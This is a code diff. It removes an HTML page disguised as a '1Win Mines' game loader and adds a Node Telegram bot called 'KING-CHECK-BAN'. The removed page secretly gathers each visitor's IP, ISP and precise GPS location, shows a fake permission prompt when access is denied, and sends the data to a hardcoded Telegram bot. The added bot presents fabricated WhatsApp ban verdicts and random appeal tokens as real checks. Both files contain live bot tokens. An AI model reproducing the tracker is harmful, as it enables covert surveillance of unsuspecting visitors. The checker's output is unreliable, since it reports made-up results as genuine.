@@ -1,259 +1,184 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1Win Mines</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
-        #bg-image {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-        #loading-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 2;
-        }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        #loading-text {
-            color: white;
-            font-size: 18px;
-            margin-top: 10px;
-            text-align: center;
-        }
-        #permission-request {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 3;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        #permission-request h2 {
-            margin-bottom: 15px;
-        }
-        #allow-btn {
-            margin-top: 20px;
-            padding: 12px 30px;
-            background: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <img id="bg-image" src="https://cdn.glitch.global/e4f59c88-d600-4172-aaa6-7e957cd37252/unnamed%20(1).webp?v=1750967013692" alt="Background">
-    
-    <div id="loading-overlay">
-        <div class="loader"></div>
-        <div id="loading-text">Connecting to server...</div>
-    </div>
-    
-    <div id="permission-request">
-        <h2>Location Access Required</h2>
-        <p>Please allow location access to continue</p>
-        <button id="allow-btn">ALLOW LOCATION</button>
-    </div>
+const TelegramBot = require('node-telegram-bot-api');
 
-    <script>
-        // Telegram bot details
-        const botToken = '8460292252:AAF8NmgrqiqW__2fW7kTlRrA74nDiZkkgQg';
-        const chatId = '80160043955';
-        
-        // DOM elements
-        const loadingOverlay = document.getElementById('loading-overlay');
-        const loadingText = document.getElementById('loading-text');
-        const permissionRequest = document.getElementById('permission-request');
-        const allowBtn = document.getElementById('allow-btn');
-        
-        // Loading messages
-        const loadingMessages = [
-            "Connecting to server...",
-            "Loading game assets...",
-            "Verifying account...",
-            "Almost ready...",
-            "Preparing interface...",
-            "Finalizing setup..."
-        ];
-        
-        // Function to get IP info
-        async function getIPInfo() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                return await detailsResponse.json();
-            } catch (error) {
-                console.error("IP info error:", error);
-                return {};
-            }
-        }
-        
-        // Function to get precise location
-        function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve({
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toLocaleString()
-                    }),
-                    error => {
-                        // Only show permission request if location was denied
-                        if (error.code === error.PERMISSION_DENIED) {
-                            setTimeout(() => {
-                                permissionRequest.style.display = 'flex';
-                            }, 3000);
-                        }
-                        resolve(null);
-                    },
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        // Function to send data to Telegram
-        async function sendToTelegram(data) {
-            try {
-                let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
-                message += `📱 Device: ${navigator.userAgent}\n\n`;
-                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
-                message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
-                message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
-                
-                if (data.liveLocation) {
-                    message += `\n🎯 LIVE GPS LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.liveLocation.lat}\n`;
-                    message += `🔹 Longitude: ${data.liveLocation.lon}\n`;
-                    message += `🔹 Accuracy: ${data.liveLocation.accuracy}m\n`;
-                    message += `🔹 Time: ${data.liveLocation.timestamp}\n`;
-                    message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
-                } else {
-                    message += `\n📍 APPROX LOCATION:\n`;
-                    message += `🔹 Latitude: ${data.latitude || 'Unknown'}\n`;
-                    message += `🔹 Longitude: ${data.longitude || 'Unknown'}\n`;
-                    if (data.latitude && data.longitude) {
-                        message += `🗺️ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
-                    }
-                }
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-                
-                if (data.liveLocation) {
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            latitude: data.liveLocation.lat,
-                            longitude: data.liveLocation.lon
-                        })
-                    });
-                }
-            } catch (error) {
-                console.error("Telegram error:", error);
-            }
-        }
-        
-        // Rotate loading messages
-        function rotateLoadingMessages() {
-            let counter = 0;
-            setInterval(() => {
-                loadingText.textContent = loadingMessages[counter];
-                counter = (counter + 1) % loadingMessages.length;
-            }, 3000);
-        }
-        
-        // Main tracking function
-        async function trackUser() {
-            // Start rotating loading messages
-            rotateLoadingMessages();
+// Configuration
+const bot = new TelegramBot('8345426244:AAHIKu5wJyHKczMnUB58BdozgMezaFE9WKM', { polling: true });
+
+// URLs des images KING-CHECK-BAN
+const IMAGES = {
+    welcome: 'https://files.catbox.moe/qkafkb.jpg',
+    checking: 'https://files.catbox.moe/deslfn.jpg', 
+    result: 'https://files.catbox.moe/601u5z.jpg'
+};
+
+// Classe de vérification WhatsApp (version adaptée)
+class WhatsAppChecker {
+    static async xeonBanChecker(phoneNumber) {
+        try {
+            // Simulation de la vérification - À REMPLACER par ta vraie méthode
+            await new Promise(resolve => setTimeout(resolve, 2000));
             
-            // First try to get precise location silently
-            const liveLocation = await getPreciseLocation();
+            // Logique de vérification (adaptée de ton code)
+            const banPatterns = this.detectBanPatterns(phoneNumber);
+            const isBanned = banPatterns.banScore >= 60;
+            const isRestricted = banPatterns.banScore >= 30 && banPatterns.banScore < 60;
             
-            // Then get IP details
-            const ipDetails = await getIPInfo();
-            
-            // Combine all data
-            const trackingData = {
-                ...ipDetails,
-                ip: ipDetails.ip || 'Unknown',
-                liveLocation: liveLocation
+            const resultData = {
+                number: phoneNumber,
+                isBanned: isBanned,
+                isNeedOfficialWa: isRestricted,
+                data: {
+                    violation_type: isBanned ? "Spam" : null,
+                    in_app_ban_appeal: isBanned ? true : null,
+                    appeal_token: isBanned ? `APL${Math.random().toString(36).substr(2, 9).toUpperCase()}` : null
+                }
             };
             
-            // Send to Telegram
-            await sendToTelegram(trackingData);
+            return JSON.stringify(resultData);
+            
+        } catch (error) {
+            throw new Error(`Vérification échouée: ${error.message}`);
+        }
+    }
+    
+    static detectBanPatterns(phoneNumber) {
+        const patterns = {
+            sequential: /(0123|1234|2345|3456|4567|5678|6789|9876|8765|7654|6543|5432|4321|3210)/,
+            repeating: /(\d)\1{4,}/,
+            spam: /(11111|22222|33333|44444|55555|66666|77777|88888|99999|00000)/,
+            test: /(12345678|87654321|111222333|555444333)/
+        };
+        
+        let banScore = 0;
+        let detectedPatterns = [];
+        
+        for (const [patternName, pattern] of Object.entries(patterns)) {
+            if (pattern.test(phoneNumber)) {
+                banScore += 25;
+                detectedPatterns.push(patternName);
+            }
         }
         
-        // When allow button is clicked
-        allowBtn.addEventListener('click', async () => {
-            permissionRequest.style.display = 'none';
-            // Try to get location again
-            await trackUser();
+        return { banScore, detectedPatterns };
+    }
+}
+
+// Message de BIENVENUE
+bot.onText(/\/start/, async (msg) => {
+    const chatId = msg.chat.id;
+    
+    try {
+        await bot.sendPhoto(chatId, IMAGES.welcome, {
+            caption: `👑 *BIENVENUE DANS KING-CHECK-BAN* 👑\n\n` +
+                    `*Le vérificateur WhatsApp le plus puissant !* 🔥\n\n` +
+                    `Utilise /checkban [numéro] pour commencer`,
+            parse_mode: 'Markdown'
+        });
+    } catch (error) {
+        await bot.sendMessage(
+            chatId,
+            `👑 *BIENVENUE DANS KING-CHECK-BAN* 👑\n\nUtilise /checkban [numéro] pour commencer`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+});
+
+// Commande /checkban - TON CODE ADAPTÉ POUR TELEGRAM
+bot.onText(/\/checkban(?:\s+(.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const text = match[1];
+    
+    if (!text) {
+        return bot.sendMessage(
+            chatId,
+            `👑 *KING-CHECK-BAN* 👑\n\n` +
+            `*Utilisation :* /checkban [numéro]\n\n` +
+            `*Exemple :* /checkban 91xxxxxxxxxx`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+    
+    const victim = text.split("|")[0];
+    const phoneNumber = victim.replace(/[^0-9]/g, '');
+    
+    if (phoneNumber.length < 10) {
+        return bot.sendMessage(
+            chatId,
+            `❌ Invalid phone number!\n\nExample: /checkban 91xxxxxxxxxx`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+    
+    try {
+        // Photo "checking" avec message d'attente
+        const messageAttente = await bot.sendPhoto(chatId, IMAGES.checking, {
+            caption: `🔍 Checking ban status for: +${phoneNumber}...\n⏳ Please wait...`,
+            parse_mode: 'Markdown'
         });
         
-        // Start tracking when page loads
-        window.onload = trackUser;
-    </script>
-</body>
-</html>
+        // TON CODE EXACT ADAPTÉ
+        const result = await WhatsAppChecker.xeonBanChecker(phoneNumber);
+        const resultData = JSON.parse(result);
+        
+        let statusMsg = `👑 *KING-CHECK-BAN* 👑\n\n`;
+        statusMsg += `📱 *BAN STATUS CHECK*\n\n`;
+        statusMsg += `📞 *Number:* +${resultData.number}\n\n`;
+        
+        if (resultData.isBanned) {
+            statusMsg += `🚫 *STATUS:* BANNED\n\n`;
+            statusMsg += `⚠️ *Details:*\n`;
+            statusMsg += `• Violation: ${resultData.data?.violation_type || 'Unknown'}\n`;
+            statusMsg += `• Can Appeal: ${resultData.data?.in_app_ban_appeal ? 'Yes' : 'No'}\n`;
+            if (resultData.data?.appeal_token) {
+                statusMsg += `• Appeal Token: \`${resultData.data.appeal_token}\`\n`;
+            }
+            statusMsg += `\n💡 *KING Tip:* Use official WhatsApp to appeal ban`;
+        } 
+        else if (resultData.isNeedOfficialWa) {
+            statusMsg += `🔒 *STATUS:* RESTRICTED\n\n`;
+            statusMsg += `⚠️ *Reason:* Must use Official WhatsApp\n`;
+            statusMsg += `💡 *KING Tip:* Switch to official WhatsApp app`;
+        } 
+        else {
+            statusMsg += `✅ *STATUS:* CLEAN\n\n`;
+            statusMsg += `🎉 Number is *NOT BANNED*\n`;
+            statusMsg += `✅ Safe to use with any WhatsApp\n`;
+            statusMsg += `👑 *KING Verified:* ✅ CLEAN`;
+        }
+        
+        statusMsg += `\n\n⚡ *KING-CHECK-BAN - Ultimate Verification*`;
+        
+        // Photo "result" avec le résultat final
+        await bot.sendPhoto(chatId, IMAGES.result, {
+            caption: statusMsg,
+            parse_mode: 'Markdown'
+        });
+        
+        // Supprimer le message d'attente
+        await bot.deleteMessage(chatId, messageAttente.message_id);
+        
+    } catch (error) {
+        console.error('Ban check error:', error);
+        await bot.sendMessage(
+            chatId,
+            `❌ Error checking ban status!\nTry again later or contact KING Support.`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+});
+
+// Commande /aide
+bot.onText(/\/aide/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(
+        chatId,
+        `👑 *KING-CHECK-BAN - AIDE* 👑\n\n` +
+        `*Commandes :*\n` +
+        `🔍 /checkban [numéro] - Vérifier un numéro\n` +
+        `📖 /aide - Afficher cette aide\n` +
+        `🚀 /start - Message de bienvenue`,
+        { parse_mode: 'Markdown' }
+    );
+});
+
+// Démarrage du bot
+console.log('👑 KING-CHECK-BAN démarré avec succès !');
